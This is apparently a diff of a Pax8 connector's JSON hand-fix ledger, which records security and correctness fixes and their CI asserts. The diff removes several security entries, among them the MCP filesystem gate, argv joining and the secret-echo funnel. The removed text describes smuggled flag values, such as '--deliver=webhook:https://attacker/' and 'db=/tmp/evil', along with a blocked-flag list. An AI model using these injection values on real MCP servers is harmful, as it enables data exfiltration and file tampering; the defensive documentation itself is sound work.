@@ -3,35 +3,8 @@
  "doc": "docs/reprint-survival.md",
  "handfixes": [
   {
-   "id": "env-oauth-secrets-not-persisted",
-   "summary": "SaveTokens keeps the env-override marker on ClientID/ClientSecret, so env-supplied OAuth credentials are never written to config.toml (issue #266)",
-   "why": "Load() marks ClientID/ClientSecret as env overrides and configForSave() restores the file value for any field still marked -- the mechanism that keeps env-supplied secrets off disk. SaveTokens() cleared both markers on every save, so each token mint (an ordinary authenticated command, no `auth login` step needed) rewrote the live client_id and client_secret into ~/.config/<tool>-cli/config.toml in cleartext, defeating Keychain/Credential-Manager setups that inject the secret as an env var at process launch. SaveTokens now leaves those two markers alone; only MarkCredentialsExplicit clears them, and only `auth login` calls it, passing whether each value came from a flag rather than from the env fallback. Provenance must be declared, not inferred: comparing the incoming value against the loaded one cannot tell an explicit flag from the env value it duplicates, and `auth login` trims its env fallback while Load does not, so a padded variable compares unequal to itself and leaks. Reported by @Xenith-B against halopsa-cli/ninjaone-cli. GENERATOR-class defect (the press emits the unconditional deletes) tracked for an upstream retro; until the press is fixed, a reprint reintroduces the leak and these markers guard the connector. Bug-fix-only: no new flag, command, or output.",
-   "status": "active",
-   "spec_encode_followup": "DONE UPSTREAM: mvanhorn/cli-printing-press#4393 merged 2026-08-28 (closed #4283 as completed), first shipped press v4.31.2; this hand-fix stays active until a reprint absorbs it; do NOT cite #4283 as open. Encoded there: SaveTokens must not clear the ClientID/ClientSecret env-override markers. Only a credential the caller supplied through an explicit command-line flag may clear them, and the flag's provenance must be passed in by the caller -- NOT inferred by comparing the incoming value against the loaded one. An explicit flag whose value equals the environment's is still explicit and must persist; conversely `auth login` trims its env fallback while Load does not, so a padded variable compares unequal to itself and a value-based rule leaks it.",
-   "asserts": [
-    {
-     "file": "cli/internal/config/config.go",
-     "contains": "func (c *Config) MarkCredentialsExplicit(clientID, clientSecret bool) {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/cli/auth.go",
-     "contains": "cfg.MarkCredentialsExplicit(explicitClientID, explicitClientSecret)",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/config/config.go",
-     "contains": "markers now survive a save; only MarkCredentialsExplicit clears them.",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/config/config.go",
-     "not_contains": "delete(c.envOverrides, \"ClientID\")\n\tdelete(c.envOverrides, \"ClientSecret\")\n\tdelete(c.envOverrides, \"AccessToken\")"
-    }
-   ]
-  },
-  {
    "id": "doctor-verdict-tracks-reality",
+   "class": "doctor-truth",
    "summary": "doctor probes a real GET endpoint with the real credential and refuses to dial a placeholder base_url, instead of calling any HTTP response 'reachable' and never checking the credential",
    "why": "`doctor` is the command every SKILL, guide and docs page tells an operator to run to confirm the connector works, and it could not tell a working install from a broken one. It called any HTTP response to `GET /` \"reachable\" and rendered it green, so a base_url aimed at the vendor's web UI (where every API path 404s) and a token rejected with 401 on every call both produced an all-green report. On this connector family it also never probed the credential at all: it printed \"present, not verified\" and left the operator to guess. The mirror defect: a connector whose shipped base_url default is a placeholder dialled the placeholder host, and the DNS failure rendered as \"FAIL API: unreachable\" - telling a correctly-credentialled operator they were broken without naming the one variable that would fix it. Several placeholder hosts resolve through live wildcard DNS and answer real HTTP, so dialling one produced a confident green verdict against a stranger's server. Measured and gated by tools/maintainer/check_doctor_truth.py. See issue #282.",
    "status": "active",
@@ -41,7 +14,7 @@
      "contains": "func doctorProbeCredentials("
     },
     {
-     "file": "cli/internal/cli/doctor_verdict.go",
+     "file": "cli/internal/cli/doctor.go",
      "contains": "func doctorBaseURLIsPlaceholder("
     },
     {
@@ -63,11 +36,42 @@
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "for _, v := range report {"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorProbeCredentials(cmd.Context(), c, cmd.Root(),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"credentials\"] = \"ERROR not verified: no credential is configured, so nothing was probed.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = \"not configured (base_url is a placeholder); set \" + doctorBaseURLEnv + \" to your own instance URL\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedPlaceholder(cfg.BaseURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedPlaceholder(base string) bool {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
   {
    "id": "install-credentials-declared-on-every-channel",
+   "class": "docs",
    "summary": "every operator credential this connector reads is declared on all three install channels: manifest.json (.mcpb), server.json (MCP Registry) and mcp-install.md (manual install)",
    "why": "Issue #282 ('three live-verified connectors prompt for the wrong credentials'). A connector is installed through THREE independent channels that each carry their own copy of the credential list: manifest.json server.mcp_config.env (what the .mcpb bundle hands Claude Desktop, which has no shell profile, no config.toml and no export - so an undeclared variable is a variable nobody is ever asked for), server.json environmentVariables (the MCP Registry publish channel), and mcp-install.md's copy-paste JSON blocks plus its remote launch line (the manual path, which never touches the bundle at all). The fleet-wide audit found 60 of 65 connectors under-declaring 122 operator-facing variables in the manifest, 61 of 65 mcp-install.md pages omitting 125, and hudu's server.json missing the base URL its manifest marks required. For pax8 the manifest gained: PAX8_AUDIENCE, PAX8_BASE_URL, PAX8_TOKEN_URL. server.json gained: PAX8_AUDIENCE, PAX8_BASE_URL, PAX8_TOKEN_URL. mcp-install.md's env blocks gained: PAX8_AUDIENCE, PAX8_BASE_URL, PAX8_TOKEN_URL. manifest.json, server.json and mcp-install.md are ALL regenerated by /msp-skills-publish on an UPDATE or re-onboard, so without this ledger a regeneration silently drops every declaration and CI stays green (check_env_schema.py is wired --warn). The asserts below name the specific credentials, not a count, so dropping one and adding another cannot cancel out.",
    "status": "active",
@@ -166,56 +170,8 @@
    ]
   },
   {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
-     "min_count": 1
-    }
-   ]
-  },
-  {
    "id": "no-config-write-switch",
+   "class": "secret-persisted",
    "summary": "PAX8_NO_CONFIG_WRITE makes every credential write a no-op (token cache included) while leaving the `auth logout` erase working, and the MCP server honours it too (issue #270)",
    "why": "Issue #270, raised by @Xenith-B off the back of #266. #266 stopped env-supplied client credentials reaching disk; the MINTED access token still landed in ~/.config/<tool>-cli/config.toml in cleartext and there was no supported way to turn that off. Their workaround was `--config NUL`, which is OS-specific, undocumented, makes doctor report a false 'not configured', and - the part that matters most - does not cover the MCP servers at all, because internal/mcp resolved its own hardcoded config path and ignored --config. Three deliberate boundaries make this switch honest rather than merely quiet. (1) ClearTokens keeps calling save() directly: it is the ERASE path, and routing it through the guard would make `auth logout` silently inert, which is a worse defect than the one being fixed. (2) `auth login` and `auth set-token` REFUSE and name the variable rather than reporting a save that did not happen - a false success is the same defect class as a doctor that says credentials are fine without checking. (3) newMCPClient now resolves through config.Load(\"\"), the resolver the CLI uses, so the MCP server honours both PAX8_CONFIG and this switch; that is the half the issue says is uncovered today. The variable is declared on all three install channels because for a Claude Desktop install the manifest prompt is the ONLY channel that can set an environment variable. Class C, new documented surface. GENERATOR-class: a reprint drops the switch entirely and silently restores the plaintext token cache.",
    "status": "active",
@@ -272,11 +228,6 @@
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/mcp_config_resolution_test.go",
-     "contains": "func TestMCPClientHonoursTheConfigEnvVar(",
-     "min_count": 1
-    },
-    {
      "file": "cli/internal/cli/auth.go",
      "contains": "if config.NoConfigWrite() {",
      "min_count": 2
@@ -290,161 +241,22 @@
      "file": "guide.md",
      "contains": "| `auth login` / `auth set-token` | Refuse, naming the variable, instead of reporting a save that did not happen. |",
      "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
-   "status": "active",
-   "asserts": [
+    },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
+     "file": "cli/internal/config/config.go",
+     "contains": "return c.saveCredentialMaterial()",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
+     "file": "cli/internal/config/config.go",
+     "contains": "func NoConfigWrite() bool {",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; the README and page.json ChatGPT answers say this build's remote path is paused.",
-   "why": "Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under \"Works with your agent\", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
-    }
-   ]
-  },
-  {
-   "id": "mcp-file-flags-refused",
-   "class": "mcp-file-flag",
-   "summary": "An MCP tool call can no longer name a file or directory on the MCP host: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path)",
-   "why": "The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path). The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "blocked := blockedFlagsForCommand(cmd)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "shellOutToCLI(cliPath, path, blocked, declaredMCPFlagNames(cmd), inlineOnlyFlagsForCommand(cmd), commandTakesArgs(cmd))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "func toolOptionsForFlags(cmd *cobra.Command, blocked map[string]bool) []mcplib.ToolOption {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "if blocked[flag.Name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "if msg := refuseMCPArgs(args, declared, blocked, inlineOnly, takesArgs); msg != \"\" {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func refuseMCPArgs(args map[string]any, declared, blocked, inlineOnly map[string]bool, takesArgs bool) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func blockedFlagsForCommand(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "if name != mcpPositionalArgsField && !local[name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func flagWriteSinkNames(cmd *cobra.Command) map[string]bool {",
+     "file": "cli/internal/cli/auth.go",
+     "contains": "if config.NoConfigWrite() {",
      "min_count": 1,
      "code_only": true
     }
@@ -504,12 +316,6 @@
    "status": "active",
    "spec_encode_followup": "Press fix: client.go.tmpl should skip the client-credentials mint when DryRun is set (the dry-run preview already uses cached material only), and auth.go.tmpl's login should honor the root --dry-run flag.",
    "asserts": [
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "if !c.DryRun && needsClientCredentialsMint(c.Config) {",
-     "min_count": 1,
-     "code_only": true
-    },
     {
      "file": "cli/internal/cli/auth.go",
      "contains": "(dry run - no request sent, nothing saved)",
@@ -605,176 +411,20 @@
      "contains": "func TestAuthLoginRefusesATokenRedirectToAnotherOrigin(",
      "min_count": 1,
      "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "secret-echo-decoded-funnel",
-   "class": "secret-echo",
-   "summary": "One decoded output funnel for every server text the client shows: maskCredentialText (every API error, transport error, displayed URL and --dry-run parameter goes through it) still masks each held credential as written and URL-escaped, then withholds the WHOLE text if any held value survives in any view reachable by undoing control/format characters, JSON and JavaScript escapes, percent escapes at any depth, HTML entities, markup tags, and base64/base64url/hex runs at every alignment (cliutil.FunnelWithhold, shared byte-identical across the fleet). The held set is every value the masks cover plus the part after a scheme word and both halves of a base64 id:secret pair (Basic auth, composed keys). Surfaces funnelled here: the API error body (checked whole before the 4096-byte display cut, then again as shown); the OAuth client-credentials token endpoint's error body; the token refresh endpoint's error body. The `auth login` token exchange (internal/cli/auth.go mintClientCredentialsToken) funnels its error body with the client secret it sent. Round 3 (owner-approved structural pass): the decoder searches every view breadth-first over one fixed set of steps (control-character drop, JSON and JavaScript escapes, the identity escape as its own step, percent, HTML entities, tag strip, base64 at four alignments, hex at two), matches every view, the original included, before any filter, keeps every view a step makes (a literal backslash survives), deduplicates, and is capped by total work (512 times the input plus 4 MiB; text over 1 MiB or past the cap is withheld). Every value a funnel call is given is held process-wide (cliutil.FunnelHold), and the client holds its credentials when built and its resolved auth header on every request. Two error-only backstops withhold any held value: every command error before Cobra prints it plus every JSON/agent error envelope (internal/cli/secret_funnel_cli.go), and every MCP error result and handler error through the outermost tool middleware (cmd/<mcp>/secret_funnel_mcp.go). Success output is never funnelled.",
-   "why": "class_harness.py secret-echo (Step 3.1, PR #436) drives the built CLI and MCP server against a fake server that reflects each configured credential in every encoding; on origin/main this connector printed the credential HTML-entity-encoded, JSON-escaped, double URL-encoded or base64 (the generated masks cover only the raw, QueryEscape and PathEscape forms; press issue #5145). Matching encoded needles one at a time never converged (saas-alerts and cisco-meraki review loops), so the fix is a decode-then-check backstop that withholds the whole text and fails closed (text over 4 MiB, a decoding chain that does not settle in 32 rounds, or work past the budget is withheld). Classification is kept: the plain withheld notice avoids every word the auth-error classifiers match, and a withheld text that itself read as an auth failure gets a notice that says so (an HTTP 400 'invalid token' answer echoing the token keeps its auth exit code). Codex round 1 (2026-10-23) added that, the fail-closed depth bound (a text-like layer left at depth 8 withholds), the JavaScript escapes \\v, \\0 and the identity escape, a bounded \\u{ search, and the token-endpoint error bodies outside the client. Known limits: values under 8 characters are only masked as written; case-changed, split-and-interleaved or otherwise transformed (compressed, encrypted) echoes are not reconstructed. A reprint that drops these edits fails class_harness.py secret-echo in CI and these asserts.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: cli-printing-press issue #5145 (encoded credential echo). The generated maskCredentialText should end in a decode-then-check backstop over every held credential, and the error-body and token-endpoint paths should check the whole body before the display cut.",
-   "asserts": [
+    },
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelEchoes(text string, secrets []string) bool {",
+     "file": "cli/internal/cliutil/oauth_token.go",
+     "contains": "if !oauthTokenSameHost(target.Hostname(), origin.Hostname()) {",
      "min_count": 1,
      "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelRecognizesEveryEncodingOfAHeldSecret(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "held = append(held, value)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "return cliutil.FunnelWithhold(masked, held)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "func (c *Client) shownErrorBody(body []byte, extraCredentials ...string) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "Body:       c.shownErrorBody(respBody, authHeader),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "c.maskCredentialText(truncateBody(respBody), authHeader)"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "cliutil.SanitizeErrorBody(c.shownErrorBody(body, clientID, clientSecret))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "cliutil.SanitizeErrorBody(c.shownErrorBody(body)))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(string(body))"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(truncateBody(body))"
-    },
-    {
-     "file": "cli/internal/cli/auth.go",
-     "contains": "cliutil.SanitizeErrorBody(cliutil.FunnelWithhold(string(body), []string{clientSecret}))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/auth.go",
-     "not_contains": "cliutil.SanitizeErrorBody(string(body))"
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "var funnelSteps = []func(string) []string{",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "funnelTextStep(funnelIdentityUnescape),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelHeld(text string) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelCodexRound2(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/secret_funnel_cli.go",
-     "contains": "func funnelCommandErrors(root *cobra.Command) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/secret_funnel_cli_test.go",
-     "contains": "func TestFunnelCommandErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/root.go",
-     "contains": "funnelCommandErrors(rootCmd)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/cmd/pax8-mcp/main.go",
-     "contains": "server.WithToolHandlerMiddleware(funnelToolErrors),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/cmd/pax8-mcp/secret_funnel_mcp.go",
-     "contains": "func funnelToolErrors(next server.ToolHandlerFunc) server.ToolHandlerFunc {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/cmd/pax8-mcp/secret_funnel_mcp_test.go",
-     "contains": "func TestFunnelToolErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "c.holdCredentials()",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "cliutil.FunnelHold(authHeader)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/helpers.go",
-     "contains": "funnelShownError(err),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/helpers.go",
-     "not_contains": "\"error\": err.Error(),"
     }
    ]
   },
   {
    "id": "oauth-audience-on-token-request",
    "class": "auth-wire",
-   "summary": "The client_credentials token request sends audience=api://p8p.client (overridable with PAX8_AUDIENCE); press 4.34.0 does not emit it",
-   "why": "Pax8's token manager (https://token-manager.pax8.com/oauth/token) requires an audience on the client_credentials request (the hand edit's own comment: without it the mint is rejected or yields an unusable token, so every command fails auth). client.go carries a hand-added resolveClientCredentialsAudience() (PAX8_AUDIENCE, default api://p8p.client) and mintClientCredentials sets it on the form. Press 4.34.0's client.go.tmpl has no audience support and no spec extension expresses one (first noted on the 4.22 reprint as not absorbed upstream), so a reprint regenerates client.go without it. The install-credentials-declared-on-every-channel entry pins only the PAX8_AUDIENCE declarations in manifest.json, server.json and mcp-install.md: a reprint that dropped the code would leave PAX8_AUDIENCE declared but unread. check_env_schema.py then fails, but its fix hint ('Drop it everywhere if the binary no longer reads it') steers toward deleting the declarations, which would remove the override for good; this entry instead fails check_handfixes.py at the dropped lines and names the hand edit to restore. These asserts are code_only so a doc comment naming the function cannot satisfy them.",
+   "summary": "Both client_credentials token requests (the automatic mint and `auth login`) send audience=api://p8p.client (overridable with PAX8_AUDIENCE) from one form builder; press 4.34.2 does not emit it",
+   "why": "Pax8's token manager (https://token-manager.pax8.com/oauth/token) requires an audience on the client_credentials request (the hand edit's own comment: without it the mint is rejected or yields an unusable token, so every command fails auth). client.go carries a hand-added resolveClientCredentialsAudience() (PAX8_AUDIENCE, default api://p8p.client) and mintClientCredentials sets it on the form. Press 4.34.0's client.go.tmpl has no audience support and no spec extension expresses one (first noted on the 4.22 reprint as not absorbed upstream), so a reprint regenerates client.go without it. The install-credentials-declared-on-every-channel entry pins only the PAX8_AUDIENCE declarations in manifest.json, server.json and mcp-install.md: a reprint that dropped the code would leave PAX8_AUDIENCE declared but unread. check_env_schema.py then fails, but its fix hint ('Drop it everywhere if the binary no longer reads it') steers toward deleting the declarations, which would remove the override for good; this entry instead fails check_handfixes.py at the dropped lines and names the hand edit to restore. These asserts are code_only so a doc comment naming the function cannot satisfy them. pax8 